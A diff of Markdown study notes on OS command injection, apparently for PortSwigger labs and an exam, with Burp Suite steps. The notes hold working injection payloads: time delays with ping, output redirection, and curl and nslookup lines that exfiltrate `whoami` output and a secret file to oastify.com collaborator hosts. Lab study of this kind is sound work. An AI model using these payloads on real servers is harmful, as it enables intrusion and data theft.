@@ -1,4 +1,4 @@
-## Stage 3
+### Stage 3
 ### What is it?
 Aka shell injection. It allows an attacker to execute operating system (OS) commands on the server. 
 ### Use these to Identify OS Command Injections
@@ -14,11 +14,11 @@ ls
 ```
 
 ### Use Burp Scanner to find 
-![OS Command Injection-20260118163612191](OS%20Command%20Injection-20260118163612191.png)
-![OS Command Injection-20260118163548858](OS%20Command%20Injection-20260118163548858.png)
+![[OS Command Injection-20260118163612191.png]]
+![[OS Command Injection-20260118163548858.png]]
 
 *Intruder > add positions to all params*
-![OS Command Injection-20260118164231547](OS%20Command%20Injection-20260118164231547.png)
+![[OS Command Injection-20260118164231547.png]]
 ### How to identify
 Check stock or Submit feedback
 
@@ -52,11 +52,11 @@ Retrieve the secret
 
 - `||ping+-c+5+127.0.0.1||` 
 	- takes ~5secs from response
-		- [OS Command Injection](OS%20Command%20Injection.md#3.2.%20Lab%20Blind%20OS%20command%20injection%20with%20time%20delays%20%E2%AD%95%EF%B8%8F)
-		- [OS Command Injection](OS%20Command%20Injection.md#3.3.%20Lab%20Blind%20OS%20command%20injection%20with%20output%20redirection%20%E2%AD%95%EF%B8%8F)
+		- [[OS Command Injection#3.2. Lab Blind OS command injection with time delays ⭕️]]
+		- [[OS Command Injection#3.3. Lab Blind OS command injection with output redirection ⭕️]]
 	- immediate response
-		- [OS Command Injection](OS%20Command%20Injection.md#3.4.%20Lab%20Blind%20OS%20command%20injection%20with%20out-of-band%20interaction%20%E2%AD%95%EF%B8%8F)
-		- [OS Command Injection](OS%20Command%20Injection.md#3.5.%20Lab%20Blind%20OS%20command%20injection%20with%20out-of-band%20data%20exfiltration%20%E2%AD%95%EF%B8%8F)
+		- [[OS Command Injection#3.4. Lab Blind OS command injection with out-of-band interaction ⭕️]]
+		- [[OS Command Injection#3.5. Lab Blind OS command injection with out-of-band data exfiltration ⭕️]]
 
 
 Check stock
@@ -67,15 +67,15 @@ productId=2&storeId=|curl+8irzw52rmo1v1tbmg7acd469d0j273vs.oastify.com?c=`cat+/h
 
 productId=2&storeId=|curl+`cat+/home/carlos/secret`.8irzw52rmo1v1tbmg7acd469d0j273vs.oastify.com
 ```
-- [OS Command Injection](OS%20Command%20Injection.md#3.1.%20Lab%20OS%20command%20injection%2C%20simple%20case%20%E2%AD%95%EF%B8%8F)
+- [[OS Command Injection#3.1. Lab OS command injection, simple case ⭕️]]
 
 Target scan submit feedback or any `POST` request 
 - `||ping+-c+5+127.0.0.1||` 
 	- takes ~5secs from response
-		- [OS Command Injection](OS%20Command%20Injection.md#3.2.%20Lab%20Blind%20OS%20command%20injection%20with%20time%20delays%20%E2%AD%95%EF%B8%8F)
-		- [OS Command Injection](OS%20Command%20Injection.md#3.3.%20Lab%20Blind%20OS%20command%20injection%20with%20output%20redirection%20%E2%AD%95%EF%B8%8F)
+		- [[OS Command Injection#3.2. Lab Blind OS command injection with time delays ⭕️]]
+		- [[OS Command Injection#3.3. Lab Blind OS command injection with output redirection ⭕️]]
 	- immediate response
-		- [OS Command Injection](OS%20Command%20Injection.md#3.4.%20Lab%20Blind%20OS%20command%20injection%20with%20out-of-band%20interaction%20%E2%AD%95%EF%B8%8F)
+		- [[OS Command Injection#3.4. Lab Blind OS command injection with out-of-band interaction ⭕️]]
 
 ---
 #### 3.1. Lab: OS command injection, simple case ⭕️
@@ -86,7 +86,7 @@ The application executes a shell command containing user-supplied product and st
 To solve the lab, execute the `whoami` command to determine the name of the current user.
 1. Select and item, click check stock, send `POST /product/stock` to Repeater. 
 2. Append `|whoami` to `storeId=1` to solve.
-	1. ![OS Command Injection-20260118163139774](OS%20Command%20Injection-20260118163139774.png)
+	1. ![[OS Command Injection-20260118163139774.png]]
 >[!tip] How to Identify this Vulnerability?
 >1. `POST` request with a feature to get a response from the server e.g., check stock
 >2. Use Burp scan insertion point
@@ -109,18 +109,18 @@ To solve the lab, exploit the blind OS command injection vulnerability to cause 
 1. Fill out the Submit Feedback feature and send the `POST /feedback/submit` request to Repeater.
 2. Identifying the vulnerable parameter:
 	1. Send the `POST` request to Repeater > add positions to the value of each parameter
-		1. ![OS Command Injection-20260118164231547](OS%20Command%20Injection-20260118164231547.png)
+		1. ![[OS Command Injection-20260118164231547.png]]
 	2. Right click > scan insertion points. After a bit, the scanner will find the vulnerable parameter. *Just running the scan actually solved the lab*
-		1. ![OS Command Injection-20260118164124659](OS%20Command%20Injection-20260118164124659.png)
+		1. ![[OS Command Injection-20260118164124659.png]]
 3. If it doesn't solve automatically, now that we know the `email` param is vulnerable, go back to Repeater, change the param to `email=x||ping+-c+10+127.0.0.1||`, Send and it should solve. Notice the response took around 10 seconds to get back.
-	1. ![OS Command Injection-20260118164442447](OS%20Command%20Injection-20260118164442447.png)
+	1. ![[OS Command Injection-20260118164442447.png]]
 
 #ExamTip Use this command to execute a command and send what we want to burp collaborator. In the exam, we'd want to exfiltrate the secret file. Since this a blind os command injection vulnerability, we see the results of the command(s) from the response.
 ```
 email=carlos@exam.net||curl+`whoami`.OASTIFY.COM||
 ```
-![OS Command Injection-20260118164726905](OS%20Command%20Injection-20260118164726905.png)
-![OS Command Injection-20260118164759039](OS%20Command%20Injection-20260118164759039.png)
+![[OS Command Injection-20260118164726905.png]]
+![[OS Command Injection-20260118164759039.png]]
 >[!tip] How to Identify this Vulnerability?
 >1. `POST` request with a feature to get a response from the server e.g., check stock
 >2. Use Burp scan insertion point
@@ -149,12 +149,12 @@ The application serves the images for the product catalog from this location. Yo
 To solve the lab, execute the `whoami` command and retrieve the output.
 1. Fill out the Submit Feedback feature and send the `POST /feedback/submit` request to Repeater.
 2. Follow Step 2 of the previous lab to use burp scanner to find the vulnerable param: `email`.
-	1. ![OS Command Injection-20260118165556840](OS%20Command%20Injection-20260118165556840.png)
+	1. ![[OS Command Injection-20260118165556840.png]]
 3. Run the `whoami` command via `email` param and save the results in `output.txt` within the writable `/var/www/images/` directory: `email=||whoami>/var/www/images/output.txt||`. You might see a 500 error and that's ok. Lab solved.
-	1. ![OS Command Injection-20260118165851548](OS%20Command%20Injection-20260118165851548.png)
+	1. ![[OS Command Injection-20260118165851548.png]]
 4. Go to HTTP History and grab the `GET` request that retrieve image files and send to Repeater. Change `72.jpg` to `output.txt`. 
-	1. ![OS Command Injection-20260118165941687](OS%20Command%20Injection-20260118165941687.png)
-	2. ![OS Command Injection-20260118170025447](OS%20Command%20Injection-20260118170025447.png)
+	1. ![[OS Command Injection-20260118165941687.png]]
+	2. ![[OS Command Injection-20260118170025447.png]]
 
 >_**Identify**_ the working directory using `pwd` command output redirected, and appending to `output.txt` file every bash command stdout.
 ```
@@ -197,8 +197,8 @@ To solve the lab, exploit the blind OS command injection vulnerability to issue 
 ```
 ||curl+`whoami`.OASTIFY.COM||
 ```
-![OS Command Injection-20260118170741559](OS%20Command%20Injection-20260118170741559.png)
-![OS Command Injection-20260118170806393](OS%20Command%20Injection-20260118170806393.png)
+![[OS Command Injection-20260118170741559.png]]
+![[OS Command Injection-20260118170806393.png]]
 
 #ExamTip For the exam, use the following payload to get the secret file.
 ```
@@ -220,9 +220,9 @@ To solve the lab, execute the `whoami` command and exfiltrate the output via a
 ```
 email=aaa@aaa.com||nslookup+`whoami`.OASTIFY.COM||
 ```
-![OS Command Injection-20260118171205290](OS%20Command%20Injection-20260118171205290.png)
+![[OS Command Injection-20260118171205290.png]]
 3. Poll burp collaborator and see a DNS request along with the machine's username. Submit and solve.
-	1. ![OS Command Injection-20260118171336801](OS%20Command%20Injection-20260118171336801.png)
+	1. ![[OS Command Injection-20260118171336801.png]]
 
 **Use the same payloads from the previous lab**
 
